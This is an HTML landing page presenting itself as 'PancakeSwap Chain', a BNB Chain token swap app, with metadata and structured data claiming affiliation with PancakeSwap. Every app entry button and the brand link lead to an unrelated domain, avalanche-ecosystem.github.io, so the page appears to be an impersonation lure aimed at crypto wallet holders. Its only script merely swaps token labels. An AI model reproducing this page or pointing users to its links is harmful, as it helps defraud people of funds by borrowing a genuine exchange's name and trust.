<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>PancakeSwap Chain</title>
  <meta name="description" content="PancakeSwap Chain is the BNB Chain DEX for swapping tokens from your own wallet.">
  <link rel="canonical" href="https://pancakeswap-chain.github.io/">
  <meta name="robots" content="index,follow,max-image-preview:large">
  <meta name="theme-color" content="#F7F6F2">
  <meta property="og:type" content="website">
  <meta property="og:title" content="PancakeSwap Chain">
  <meta property="og:description" content="PancakeSwap Chain is the BNB Chain DEX for swapping tokens from your own wallet.">
  <meta property="og:url" content="https://pancakeswap-chain.github.io/">
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="PancakeSwap Chain">
  <meta name="twitter:description" content="PancakeSwap Chain is the BNB Chain DEX for swapping tokens from your own wallet.">
  <link rel="icon" type="image/png" href="favicon.png">
  <link rel="apple-touch-icon" href="favicon.png">
  <link rel="manifest" href="site.webmanifest">
  <link rel="stylesheet" href="style.css">
  <script type="application/ld+json">
  {
    "@context": "https://schema.org",
    "@graph": [
      {
        "@type": "WebSite",
        "@id": "https://pancakeswap-chain.github.io/#website",
        "url": "https://pancakeswap-chain.github.io/",
        "name": "PancakeSwap Chain",
        "inLanguage": "en"
      },
      {
        "@type": "Organization",
        "@id": "https://pancakeswap-chain.github.io/#organization",
        "name": "PancakeSwap",
        "url": "https://pancakeswap.finance/"
      },
      {
        "@type": "WebApplication",
        "@id": "https://pancakeswap-chain.github.io/#application",
        "name": "PancakeSwap Chain",
        "applicationCategory": "FinanceApplication",
        "operatingSystem": "Web",
        "url": "https://pancakeswap-chain.github.io/"
      }
    ]
  }
  </script>
</head>
<body>
  <header class="topbar">
    <a class="brand" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">
      <img src="favicon.png" width="30" height="30" alt="">
      <span>PancakeSwap Chain</span>
    </a>
    <nav class="nav" aria-label="Authority links">
      <a href="https://bscscan.com/" target="_blank" rel="nofollow noopener noreferrer">BscScan</a>
      <a href="https://www.coingecko.com/en/coins/pancakeswap" target="_blank" rel="nofollow noopener noreferrer">CoinGecko</a>
      <a href="https://www.bnbchain.org/en" target="_blank" rel="nofollow noopener noreferrer">BNB Chain</a>
    </nav>
    <span class="spacer"></span>
    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
  </header>

  <main class="stage">
    <section class="hero" aria-labelledby="page-title">
      <h1 id="page-title">PancakeSwap Chain</h1>
      <p class="sub"><strong>PancakeSwap Chain</strong> is the BNB Chain DEX for swapping tokens from your own wallet.</p>
    </section>

    <section class="card" aria-label="DEX swap route">
      <div class="route">
        <div class="leg">
          <span class="label">From</span>
          <span class="chip">
            <img class="coin" src="bnb.png" width="28" height="28" alt="BNB">
            <span>BNB</span>
          </span>
        </div>
        <button class="switch" type="button" data-switch aria-label="Switch direction">
          <span aria-hidden="true">&#8594;</span>
        </button>
        <div class="leg">
          <span class="label">To</span>
          <span class="chip">
            <img class="coin" src="cake.png" width="28" height="28" alt="CAKE">
            <span>CAKE</span>
          </span>
        </div>
      </div>
      <a class="primary" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App <span aria-hidden="true">&#8250;</span></a>
    </section>
  </main>

  <footer class="foot">PancakeSwap Chain &mdash; 2026</footer>

  <script>
  (function () {
    "use strict";
    var button = document.querySelector("[data-switch]");
    if (!button) return;
    button.addEventListener("click", function () {
      var chips = document.querySelectorAll(".chip");
      if (chips.length < 2) return;
      var first = chips[0].innerHTML;
      chips[0].innerHTML = chips[1].innerHTML;
      chips[1].innerHTML = first;
    });
  })();
  </script>
</body>
</html>
